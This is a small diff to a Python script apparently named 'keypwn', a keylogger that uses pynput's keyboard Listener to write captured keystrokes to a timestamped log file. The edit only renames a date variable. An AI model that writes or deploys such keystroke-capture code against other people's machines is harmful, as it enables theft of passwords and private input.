@@ -10,8 +10,8 @@ import sys
 import datetime
 from pynput.keyboard import Listener
 
-date = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-log_name = open(f'keypwn_{date}.txt', 'w')
+text_date = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+log_name = open(f'keypwn_{text_date}.txt', 'w')
 
 def keypwn(key):
     keys = str(key)
